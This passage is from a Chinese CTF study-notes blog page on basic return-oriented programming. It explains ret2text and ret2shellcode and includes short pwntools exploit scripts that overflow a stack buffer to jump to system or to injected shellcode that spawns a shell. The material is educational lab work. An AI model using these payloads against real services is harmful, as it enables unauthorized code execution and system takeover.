<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>pwn基础学习-3 | 吾行吾道，虽远必至</title>
    <meta name="generator" content="VuePress 1.5.0">
    <link rel="icon" href="/icons/favicon.ico">
    <link rel="manifest" href="/manifest.json">
    <link rel="apple-touch-icon" href="/icons/apple-touch-icon.png">
    <meta name="description" content="分享zjgcjy的个人笔记、读书论文、学习知识">
    <meta name="author" content="zjgcjy">
    <meta name="keywords" content="blog, document, zjgcjy">
    <meta name="theme-color" content="#3eaf7c">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="msapplication-TileImage" content="/icons/android-chrome-192x192.png">
    <meta name="msapplication-TileColor" content="#000000">
    <link rel="preload" href="/assets/css/0.styles.8cd36500.css" as="style"><link rel="preload" href="/assets/js/app.e9262f25.js" as="script"><link rel="preload" href="/assets/js/10.8c4e16ac.js" as="script"><link rel="preload" href="/assets/js/3.ccd7177d.js" as="script"><link rel="preload" href="/assets/js/18.9c668a1d.js" as="script"><link rel="preload" href="/assets/js/6.b90dc81c.js" as="script"><link rel="prefetch" href="/assets/js/100.48f03aa0.js"><link rel="prefetch" href="/assets/js/101.e2e6efe3.js"><link rel="prefetch" href="/assets/js/102.70276e9b.js"><link rel="prefetch" href="/assets/js/103.0d0fc4b8.js"><link rel="prefetch" href="/assets/js/104.e1d0a8d8.js"><link rel="prefetch" href="/assets/js/105.1dd92f39.js"><link rel="prefetch" href="/assets/js/106.45eb0cc8.js"><link rel="prefetch" href="/assets/js/107.6615e3a2.js"><link rel="prefetch" href="/assets/js/108.18b9954e.js"><link rel="prefetch" href="/assets/js/109.fdfade21.js"><link rel="prefetch" href="/assets/js/11.874b757a.js"><link rel="prefetch" href="/assets/js/110.314d7abc.js"><link rel="prefetch" href="/assets/js/111.1e1719a5.js"><link rel="prefetch" href="/assets/js/112.61be14f3.js"><link rel="prefetch" href="/assets/js/113.c0523a1c.js"><link rel="prefetch" href="/assets/js/114.0f4e67db.js"><link rel="prefetch" href="/assets/js/115.f4d409da.js"><link rel="prefetch" href="/assets/js/116.71f0d2bf.js"><link rel="prefetch" href="/assets/js/117.d99aa68a.js"><link rel="prefetch" href="/assets/js/118.444b45a7.js"><link rel="prefetch" href="/assets/js/119.d4f62e76.js"><link rel="prefetch" href="/assets/js/12.666142bb.js"><link rel="prefetch" href="/assets/js/120.913bf391.js"><link rel="prefetch" href="/assets/js/121.6a12ef08.js"><link rel="prefetch" href="/assets/js/122.6ca1f2ba.js"><link rel="prefetch" href="/assets/js/123.3b03ea2c.js"><link rel="prefetch" href="/assets/js/124.980210bf.js"><link rel="prefetch" href="/assets/js/125.9caec96b.js"><link rel="prefetch" href="/assets/js/126.0c1b7c03.js"><link rel="prefetch" href="/assets/js/127.27ddda80.js"><link rel="prefetch" href="/assets/js/128.49bc9992.js"><link rel="prefetch" href="/assets/js/129.edb0193e.js"><link rel="prefetch" href="/assets/js/13.b4f07ca9.js"><link rel="prefetch" href="/assets/js/130.91030de4.js"><link rel="prefetch" href="/assets/js/131.d2c7d9bb.js"><link rel="prefetch" href="/assets/js/132.8ecf00b8.js"><link rel="prefetch" href="/assets/js/133.7cc554bf.js"><link rel="prefetch" href="/assets/js/134.376f0225.js"><link rel="prefetch" href="/assets/js/135.d0b61ef1.js"><link rel="prefetch" href="/assets/js/136.f489b154.js"><link rel="prefetch" href="/assets/js/137.bdf0ebc2.js"><link rel="prefetch" href="/assets/js/138.28713686.js"><link rel="prefetch" href="/assets/js/139.45d3b8f9.js"><link rel="prefetch" href="/assets/js/14.cd6a681b.js"><link rel="prefetch" href="/assets/js/140.7d8fb98c.js"><link rel="prefetch" href="/assets/js/141.02bb7216.js"><link rel="prefetch" href="/assets/js/142.a733b07f.js"><link rel="prefetch" href="/assets/js/143.577cc1af.js"><link rel="prefetch" href="/assets/js/144.a9960a56.js"><link rel="prefetch" href="/assets/js/145.90a891cb.js"><link rel="prefetch" href="/assets/js/146.dd948237.js"><link rel="prefetch" href="/assets/js/147.00274361.js"><link rel="prefetch" href="/assets/js/148.11d2e6bc.js"><link rel="prefetch" href="/assets/js/149.06fc2d81.js"><link rel="prefetch" href="/assets/js/15.f265dbd0.js"><link rel="prefetch" href="/assets/js/150.5f2bc577.js"><link rel="prefetch" href="/assets/js/151.1f88668c.js"><link rel="prefetch" href="/assets/js/152.6e91408d.js"><link rel="prefetch" href="/assets/js/153.0ae56eda.js"><link rel="prefetch" href="/assets/js/154.ac9b76b3.js"><link rel="prefetch" href="/assets/js/155.863530a5.js"><link rel="prefetch" href="/assets/js/156.86d283d3.js"><link rel="prefetch" href="/assets/js/157.88fa9fbe.js"><link rel="prefetch" href="/assets/js/158.eb1ecb76.js"><link rel="prefetch" href="/assets/js/159.eacfe1bc.js"><link rel="prefetch" href="/assets/js/16.0c40e5ec.js"><link rel="prefetch" href="/assets/js/160.fc0daae6.js"><link rel="prefetch" href="/assets/js/161.a2808e0c.js"><link rel="prefetch" href="/assets/js/162.8f296456.js"><link rel="prefetch" href="/assets/js/163.3122885d.js"><link rel="prefetch" href="/assets/js/164.fa38e4e5.js"><link rel="prefetch" href="/assets/js/165.783c4be3.js"><link rel="prefetch" href="/assets/js/166.b433212d.js"><link rel="prefetch" href="/assets/js/167.f557c351.js"><link rel="prefetch" href="/assets/js/168.69a0d570.js"><link rel="prefetch" href="/assets/js/169.d4873ce7.js"><link rel="prefetch" href="/assets/js/17.b48f5082.js"><link rel="prefetch" href="/assets/js/170.7d5ff4a4.js"><link rel="prefetch" href="/assets/js/171.7321170a.js"><link rel="prefetch" href="/assets/js/172.e05b2efe.js"><link rel="prefetch" href="/assets/js/173.0a1f6d63.js"><link rel="prefetch" href="/assets/js/174.ed105d11.js"><link rel="prefetch" href="/assets/js/175.88a8c0d7.js"><link rel="prefetch" href="/assets/js/176.6c20dfa0.js"><link rel="prefetch" href="/assets/js/177.4396dbfc.js"><link rel="prefetch" href="/assets/js/178.0165f233.js"><link rel="prefetch" href="/assets/js/179.ed3f7082.js"><link rel="prefetch" href="/assets/js/180.f3e02c84.js"><link rel="prefetch" href="/assets/js/181.9a290389.js"><link rel="prefetch" href="/assets/js/182.63ed3bfb.js"><link rel="prefetch" href="/assets/js/183.9ebe85d3.js"><link rel="prefetch" href="/assets/js/184.1eca916d.js"><link rel="prefetch" href="/assets/js/185.537f692e.js"><link rel="prefetch" href="/assets/js/186.6936acfc.js"><link rel="prefetch" href="/assets/js/187.a43b4806.js"><link rel="prefetch" href="/assets/js/188.51104f99.js"><link rel="prefetch" href="/assets/js/189.a6f3148b.js"><link rel="prefetch" href="/assets/js/19.b9462efb.js"><link rel="prefetch" href="/assets/js/20.764ee3f8.js"><link rel="prefetch" href="/assets/js/21.c40ce5c9.js"><link rel="prefetch" href="/assets/js/22.b9368925.js"><link rel="prefetch" href="/assets/js/23.00c345f4.js"><link rel="prefetch" href="/assets/js/24.f6a00db2.js"><link rel="prefetch" href="/assets/js/25.36ced408.js"><link rel="prefetch" href="/assets/js/26.dcce25f2.js"><link rel="prefetch" href="/assets/js/27.7d631ff6.js"><link rel="prefetch" href="/assets/js/28.b0c0da93.js"><link rel="prefetch" href="/assets/js/29.91fa88ab.js"><link rel="prefetch" href="/assets/js/30.c31d9164.js"><link rel="prefetch" href="/assets/js/31.e69e965f.js"><link rel="prefetch" href="/assets/js/32.51538483.js"><link rel="prefetch" href="/assets/js/33.a9a3e5ae.js"><link rel="prefetch" href="/assets/js/34.03865500.js"><link rel="prefetch" href="/assets/js/35.7abaa068.js"><link rel="prefetch" href="/assets/js/36.3f59fbf0.js"><link rel="prefetch" href="/assets/js/37.4f44c100.js"><link rel="prefetch" href="/assets/js/38.d98ad1d8.js"><link rel="prefetch" href="/assets/js/39.244ef0fc.js"><link rel="prefetch" href="/assets/js/4.39b48255.js"><link rel="prefetch" href="/assets/js/40.7d20acb0.js"><link rel="prefetch" href="/assets/js/41.9154d06f.js"><link rel="prefetch" href="/assets/js/42.d8c90129.js"><link rel="prefetch" href="/assets/js/43.a7bb9d78.js"><link rel="prefetch" href="/assets/js/44.c156e9d2.js"><link rel="prefetch" href="/assets/js/45.d31d6c6b.js"><link rel="prefetch" href="/assets/js/46.17dba80a.js"><link rel="prefetch" href="/assets/js/47.4e8d3a57.js"><link rel="prefetch" href="/assets/js/48.9e236e38.js"><link rel="prefetch" href="/assets/js/49.2c3ba04d.js"><link rel="prefetch" href="/assets/js/5.6f873a59.js"><link rel="prefetch" href="/assets/js/50.df37d0f4.js"><link rel="prefetch" href="/assets/js/51.9c246f9e.js"><link rel="prefetch" href="/assets/js/52.8aa4ffe1.js"><link rel="prefetch" href="/assets/js/53.a448c410.js"><link rel="prefetch" href="/assets/js/54.8e6ce210.js"><link rel="prefetch" href="/assets/js/55.b92f63a3.js"><link rel="prefetch" href="/assets/js/56.e1c5db78.js"><link rel="prefetch" href="/assets/js/57.7777ae05.js"><link rel="prefetch" href="/assets/js/58.bb282b4c.js"><link rel="prefetch" href="/assets/js/59.bd99eda4.js"><link rel="prefetch" href="/assets/js/60.30847a66.js"><link rel="prefetch" href="/assets/js/61.0092b14f.js"><link rel="prefetch" href="/assets/js/62.3e12fdc6.js"><link rel="prefetch" href="/assets/js/63.2e8e3e83.js"><link rel="prefetch" href="/assets/js/64.60a5e41c.js"><link rel="prefetch" href="/assets/js/65.e49e07ce.js"><link rel="prefetch" href="/assets/js/66.b2d2bc45.js"><link rel="prefetch" href="/assets/js/67.63e62a8a.js"><link rel="prefetch" href="/assets/js/68.3ead4f90.js"><link rel="prefetch" href="/assets/js/69.a2f1661b.js"><link rel="prefetch" href="/assets/js/7.e1743058.js"><link rel="prefetch" href="/assets/js/70.32a1470d.js"><link rel="prefetch" href="/assets/js/71.bb00ef49.js"><link rel="prefetch" href="/assets/js/72.bfa70d17.js"><link rel="prefetch" href="/assets/js/73.7ec5b660.js"><link rel="prefetch" href="/assets/js/74.262afd6a.js"><link rel="prefetch" href="/assets/js/75.208255cb.js"><link rel="prefetch" href="/assets/js/76.e3740999.js"><link rel="prefetch" href="/assets/js/77.6fcedbcf.js"><link rel="prefetch" href="/assets/js/78.d7b0ff3d.js"><link rel="prefetch" href="/assets/js/79.7a29a388.js"><link rel="prefetch" href="/assets/js/8.03214424.js"><link rel="prefetch" href="/assets/js/80.ddaeffc8.js"><link rel="prefetch" href="/assets/js/81.ab33473b.js"><link rel="prefetch" href="/assets/js/82.b034757a.js"><link rel="prefetch" href="/assets/js/83.6dcc83cb.js"><link rel="prefetch" href="/assets/js/84.f2cbbc9a.js"><link rel="prefetch" href="/assets/js/85.2a236a4f.js"><link rel="prefetch" href="/assets/js/86.e87d0897.js"><link rel="prefetch" href="/assets/js/87.7959c6ef.js"><link rel="prefetch" href="/assets/js/88.b7817b8a.js"><link rel="prefetch" href="/assets/js/89.72ca74d8.js"><link rel="prefetch" href="/assets/js/9.54f24a4e.js"><link rel="prefetch" href="/assets/js/90.be408d58.js"><link rel="prefetch" href="/assets/js/91.c607f51d.js"><link rel="prefetch" href="/assets/js/92.40f607f6.js"><link rel="prefetch" href="/assets/js/93.2e99df2f.js"><link rel="prefetch" href="/assets/js/94.603df639.js"><link rel="prefetch" href="/assets/js/95.bf74c86e.js"><link rel="prefetch" href="/assets/js/96.b32cb0f5.js"><link rel="prefetch" href="/assets/js/97.039fef9f.js"><link rel="prefetch" href="/assets/js/98.35c3744c.js"><link rel="prefetch" href="/assets/js/99.2ba3d38e.js"><link rel="prefetch" href="/assets/js/vendors~docsearch.32089bc4.js">
    <link rel="stylesheet" href="/assets/css/0.styles.8cd36500.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/assets/nav-logo.png" alt="吾行吾道，虽远必至" class="logo"> <span class="site-name can-hide">吾行吾道，虽远必至</span></a> <div class="links"><form id="search-form" role="search" class="algolia-search-wrapper search-box"><input id="algolia-search-input" class="search-query"></form> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">
  主页
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="文档" class="dropdown-title"><span class="title">文档</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
          论文
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/papers/academic_papers/" class="nav-link">
  学术论文
</a></li></ul></li><li class="dropdown-item"><h4>
          其他
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/papers/other_papers/" class="nav-link">
  其他文章
</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="CTF" class="dropdown-title"><span class="title">CTF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
          CTF笔记
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/reverse/" class="nav-link">
  Reverse
</a></li><li class="dropdown-subitem"><a href="/ctf/pwn/" class="nav-link router-link-active">
  Pwn
</a></li></ul></li><li class="dropdown-item"><!----> <a href="/ctf/writeup/" class="nav-link">
  writeup
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="语言" class="dropdown-title"><span class="title">语言</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/languages/cplusplus/" class="nav-link">
  C++
</a></li><li class="dropdown-item"><!----> <a href="/languages/python/" class="nav-link">
  Python
</a></li><li class="dropdown-item"><!----> <a href="/languages/android/" class="nav-link">
  Android
</a></li><li class="dropdown-item"><!----> <a href="/languages/golang/" class="nav-link">
  Golang
</a></li><li class="dropdown-item"><!----> <a href="/languages/rust/" class="nav-link">
  Rust
</a></li><li class="dropdown-item"><!----> <a href="/languages/vc/" class="nav-link">
  VC
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="工具与项目" class="dropdown-title"><span class="title">工具与项目</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/tools/" class="nav-link">
  工具
</a></li><li class="dropdown-item"><!----> <a href="/projects/" class="nav-link">
  项目
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="杂谈" class="dropdown-title"><span class="title">杂谈</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/diary/" class="nav-link">
  日记
</a></li><li class="dropdown-item"><!----> <a href="/others/" class="nav-link">
  其他
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="更多vuepress" class="dropdown-title"><span class="title">vuepress</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
          指南
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/vue/guide/" class="nav-link">
  指南
</a></li><li class="dropdown-subitem"><a href="/vue/config/" class="nav-link">
  配置
</a></li></ul></li><li class="dropdown-item"><h4>
          主题与插件
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/vue/plugin/" class="nav-link">
  插件
</a></li><li class="dropdown-subitem"><a href="/vue/theme/" class="nav-link">
  主题
</a></li></ul></li><li class="dropdown-item"><h4>
          API
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/vue/api/cli.html" class="nav-link">
  CLI
</a></li><li class="dropdown-subitem"><a href="/vue/api/node.html" class="nav-link">
  Node
</a></li></ul></li><li class="dropdown-item"><h4>
          开发指南
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/vue/miscellaneous/local-development.html" class="nav-link">
  本地开发
</a></li><li class="dropdown-subitem"><a href="/vue/miscellaneous/design-concepts.html" class="nav-link">
  设计理念
</a></li><li class="dropdown-subitem"><a href="/vue/faq/" class="nav-link">
  FAQ
</a></li><li class="dropdown-subitem"><a href="/vue/miscellaneous/glossary.html" class="nav-link">
  术语
</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="关于" class="dropdown-title"><span class="title">关于</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/about.html" class="nav-link">
  关于我
</a></li><li class="dropdown-item"><!----> <a href="https://github.com/zjgcjy" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Github
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></div></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">
  主页
</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="文档" class="dropdown-title"><span class="title">文档</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
          论文
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/papers/academic_papers/" class="nav-link">
  学术论文
</a></li></ul></li><li class="dropdown-item"><h4>
          其他
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/papers/other_papers/" class="nav-link">
  其他文章
</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="CTF" class="dropdown-title"><span class="title">CTF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
          CTF笔记
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/ctf/reverse/" class="nav-link">
  Reverse
</a></li><li class="dropdown-subitem"><a href="/ctf/pwn/" class="nav-link router-link-active">
  Pwn
</a></li></ul></li><li class="dropdown-item"><!----> <a href="/ctf/writeup/" class="nav-link">
  writeup
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="语言" class="dropdown-title"><span class="title">语言</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/languages/cplusplus/" class="nav-link">
  C++
</a></li><li class="dropdown-item"><!----> <a href="/languages/python/" class="nav-link">
  Python
</a></li><li class="dropdown-item"><!----> <a href="/languages/android/" class="nav-link">
  Android
</a></li><li class="dropdown-item"><!----> <a href="/languages/golang/" class="nav-link">
  Golang
</a></li><li class="dropdown-item"><!----> <a href="/languages/rust/" class="nav-link">
  Rust
</a></li><li class="dropdown-item"><!----> <a href="/languages/vc/" class="nav-link">
  VC
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="工具与项目" class="dropdown-title"><span class="title">工具与项目</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/tools/" class="nav-link">
  工具
</a></li><li class="dropdown-item"><!----> <a href="/projects/" class="nav-link">
  项目
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="杂谈" class="dropdown-title"><span class="title">杂谈</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/diary/" class="nav-link">
  日记
</a></li><li class="dropdown-item"><!----> <a href="/others/" class="nav-link">
  其他
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="更多vuepress" class="dropdown-title"><span class="title">vuepress</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
          指南
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/vue/guide/" class="nav-link">
  指南
</a></li><li class="dropdown-subitem"><a href="/vue/config/" class="nav-link">
  配置
</a></li></ul></li><li class="dropdown-item"><h4>
          主题与插件
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/vue/plugin/" class="nav-link">
  插件
</a></li><li class="dropdown-subitem"><a href="/vue/theme/" class="nav-link">
  主题
</a></li></ul></li><li class="dropdown-item"><h4>
          API
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/vue/api/cli.html" class="nav-link">
  CLI
</a></li><li class="dropdown-subitem"><a href="/vue/api/node.html" class="nav-link">
  Node
</a></li></ul></li><li class="dropdown-item"><h4>
          开发指南
        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/vue/miscellaneous/local-development.html" class="nav-link">
  本地开发
</a></li><li class="dropdown-subitem"><a href="/vue/miscellaneous/design-concepts.html" class="nav-link">
  设计理念
</a></li><li class="dropdown-subitem"><a href="/vue/faq/" class="nav-link">
  FAQ
</a></li><li class="dropdown-subitem"><a href="/vue/miscellaneous/glossary.html" class="nav-link">
  术语
</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="关于" class="dropdown-title"><span class="title">关于</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/about.html" class="nav-link">
  关于我
</a></li><li class="dropdown-item"><!----> <a href="https://github.com/zjgcjy" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Github
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></div></div> <!----></nav>  <ul class="sidebar-links"><li><a href="/ctf/pwn/" aria-current="page" class="sidebar-link">pwn简介</a></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>pwn基础学习</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/ctf/pwn/learning-pwn-1.html" class="sidebar-link">pwn基础学习-1</a></li><li><a href="/ctf/pwn/learning-pwn-2.html" class="sidebar-link">pwn基础学习-2</a></li><li><a href="/ctf/pwn/learning-pwn-3.html" aria-current="page" class="active sidebar-link">pwn基础学习-3</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/ctf/pwn/learning-pwn-3.html#ret2text" class="sidebar-link">ret2text</a></li><li class="sidebar-sub-header"><a href="/ctf/pwn/learning-pwn-3.html#ret2shellcode" class="sidebar-link">ret2shellcode</a></li><li class="sidebar-sub-header"><a href="/ctf/pwn/learning-pwn-3.html#ret2syscall" class="sidebar-link">ret2syscall</a></li><li class="sidebar-sub-header"><a href="/ctf/pwn/learning-pwn-3.html#ret2libc" class="sidebar-link">ret2libc</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/ctf/pwn/learning-pwn-3.html#第一题" class="sidebar-link">第一题</a></li><li class="sidebar-sub-header"><a href="/ctf/pwn/learning-pwn-3.html#第二题" class="sidebar-link">第二题</a></li><li class="sidebar-sub-header"><a href="/ctf/pwn/learning-pwn-3.html#第三题" class="sidebar-link">第三题</a></li><li class="sidebar-sub-header"><a href="/ctf/pwn/learning-pwn-3.html#第四题" class="sidebar-link">第四题</a></li></ul></li></ul></li><li><a href="/ctf/pwn/learning-pwn-4.html" class="sidebar-link">pwn基础学习-4</a></li><li><a href="/ctf/pwn/learning-pwn-5.html" class="sidebar-link">pwn基础学习-5</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>pwnable刷题</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>其他笔记</span> <span class="arrow right"></span></p> <!----></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><blockquote><p>pwn学习资料，来自ctf-wiki。
基本 ROP</p></blockquote> <hr> <p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在**栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p> <p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p> <ul><li>程序存在溢出，并且可以控制返回地址。</li> <li>可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</li></ul> <p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p> <h2 id="ret2text"><a href="#ret2text" class="header-anchor">#</a> ret2text</h2> <p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p> <p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p> <p>这种类型的题目，一般都有system函数，只要通过栈溢出来劫持控制流，返回到特定地址即可。
通过在r2中查看，我们可以看到程序中有该函数，直接跳转到该地址即可，不要跳转到secure函数首地址，因为pwn就是具有任意性，既然可以控制控制流了，就直接到system函数即可。</p> <p><img src="/img/2019-03/Snipaste_2019-03-01_11-28-51.png" alt="Snipaste_2019-03-01_11-28-51"></p> <p>脚本也很简单。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>ret_addr <span class="token operator">=</span> <span class="token number">0x804863a</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x6c</span> <span class="token operator">+</span> <span class="token string">'bbbb'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'?\n'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p><img src="/img/2019-03/Snipaste_2019-03-01_11-34-39.png" alt="Snipaste_2019-03-01_11-34-39"></p> <h2 id="ret2shellcode"><a href="#ret2shellcode" class="header-anchor">#</a> ret2shellcode</h2> <p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p> <p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p> <p>一般就是在bss段进行读写操作，然后将返回地址控制到bss段地址。</p> <p><img src="/img/2019-03/Snipaste_2019-03-01_11-58-00.png" alt="Snipaste_2019-03-01_11-58-00"></p> <p>脚本如下：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
ret_addr <span class="token operator">=</span> <span class="token number">0x0804A080</span>
payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token string">'\x90'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
